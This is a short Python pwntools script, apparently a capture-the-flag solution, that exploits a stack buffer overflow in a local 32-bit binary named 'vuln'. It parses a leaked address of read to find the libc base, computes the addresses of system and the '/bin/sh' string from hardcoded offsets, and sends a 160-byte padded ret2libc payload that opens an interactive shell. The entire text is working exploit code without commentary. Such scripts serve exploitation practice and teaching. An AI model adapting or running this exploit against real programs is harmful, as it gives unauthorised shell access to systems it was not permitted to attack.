from pwn import * 

p=process("./vuln")

#libc.so.6
read_offset = 0x000e56c0 #000e56c0   145 FUNC    GLOBAL DEFAULT   13 __read@@GLIBC_2.0
system_offset = 0x0003cd80 #  1510: 0003cd80    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
bin_sh_offset = 0x17bb8f #17bb8f /bin/sh

##LEAK Addresses
p.recvuntil('read: ')
read_leak = int(p.recv(10), 16)

#base libc
libc_base = read_leak - read_offset
system_addr = libc_base + system_offset 
binsh = libc_base + bin_sh_offset


#payload
payload = "A" * 160
payload += p32(system_addr)
payload += "A" * 4
payload += p32(binsh)

p.sendlineafter("\n",payload)
pause()
p.interactive()
